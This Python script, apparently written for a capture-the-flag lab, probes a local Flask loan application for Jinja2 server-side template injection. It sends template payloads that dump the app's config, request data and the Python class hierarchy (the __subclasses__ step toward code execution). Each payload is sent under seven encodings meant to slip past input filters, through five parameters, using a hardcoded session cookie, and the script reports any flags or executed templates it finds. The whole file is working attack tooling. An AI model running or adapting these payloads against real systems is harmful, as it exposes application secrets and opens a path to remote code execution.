import requests
import urllib.parse
import base64
import re

base_url = "http://127.0.0.1:5000"
endpoint = "/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"
cookies = {'session': session_cookie}

print("[*] Jinja2 SSTI Filter Bypass Test - /total_loan_payments")
print(f"[*] Target: {base_url}{endpoint}")
print("="*70)

# Base Jinja2 payloads for testing
base_payloads = [
    "{{'a'.__class__}}",
    "{{7*7}}",
    "{{config}}",
    "{{request}}",
    "{{request.args}}",
    "{{request.cookies}}",
    "{{''.__class__.__mro__}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
]

# Encoding functions
def url_encode(p): return urllib.parse.quote(p)
def double_url_encode(p): return urllib.parse.quote(urllib.parse.quote(p))
def html_encode(p): return p.replace('{', '&#123;').replace('}', '&#125;')
def hex_encode(p): return p.encode().hex()
def base64_encode(p): return base64.b64encode(p.encode()).decode()
def unicode_encode(p): return ''.join(f'\\u{ord(c):04x}' for c in p)

# Build test cases with different encodings
encodings = {
    'raw': lambda p: p,
    'url': url_encode,
    'double_url': double_url_encode,
    'html': html_encode,
    'hex': hex_encode,
    'base64': base64_encode,
    'unicode': unicode_encode,
}

# Test parameters
params_to_test = ['data', 'amount', 'user', 'id', 'input']
successful_tests = []
all_flags = []

total_tests = len(base_payloads) * len(encodings) * len(params_to_test)
print(f"[*] Total test combinations: {total_tests}")
print("[*] Testing...\n")

test_count = 0
for param in params_to_test:
    print(f"[-] Testing parameter: {param}")
    for payload in base_payloads:
        for enc_name, enc_func in encodings.items():
            test_count += 1
            encoded_payload = enc_func(payload)
            
            try:
                response = requests.get(
                    f"{base_url}{endpoint}",
                    params={param: encoded_payload},
                    cookies=cookies,
                    timeout=5
                )
                
                # Check response
                resp_text = response.text
                has_flag = re.search(r'FLAG\{[^}]+\}', resp_text)
                executed = any([
                    "49" in resp_text and "7*7" not in resp_text,
                    "&#39;a&#39;" in resp_text and "class" in resp_text,
                    "ImmutableMultiDict" in resp_text
                ])
                
                if has_flag:
                    flag = has_flag.group(0)
                    print(f"[!] FLAG FOUND: {flag}")
                    all_flags.append(flag)
                    successful_tests.append((param, enc_name, payload, flag))
                elif executed:
                    print(f"[!] SSTI EXECUTED - {param} | {enc_name}: {payload[:30]}...")
                    successful_tests.append((param, enc_name, payload, "executed"))
                
                if (has_flag or executed) and len(resp_text) < 1000:
                    print(f"    Response: {resp_text[:200]}")
                    
            except Exception as e:
                print(f"[ERROR] {test_count}/{total_tests} - {e}")
                continue
    print()

print("="*70)
print("[*] TEST COMPLETE")
print(f"[*] Successful tests: {len(successful_tests)}/{total_tests}")

if all_flags:
    print(f"\n[!] FLAGS FOUND ({len(all_flags)}):")
    for flag in set(all_flags):
        print(f"  {flag}")

if successful_tests:
    print(f"\n[!] WORKING COMBINATIONS:")
    for param, enc, payload, result in successful_tests[:10]:
        status = "FLAG" if "FLAG{" in result else result
        print(f"  {param} | {enc} | {status}")

# Final analysis
print(f"\n[*] Parameter coverage:")
param_stats = {}
for param in params_to_test:
    param_stats[param] = len([(p,e,pl,r) for p,e,pl,r in successful_tests if p == param])
for param, count in param_stats.items():
    print(f"  {param}: {count} successful tests")

print(f"\n[*] Encoding effectiveness:")
enc_stats = {}
for enc_name in encodings.keys():
    enc_stats[enc_name] = len([(p,e,pl,r) for p,e,pl,r in successful_tests if e == enc_name])
for enc, count in enc_stats.items():
    print(f"  {enc}: {count} successful tests")
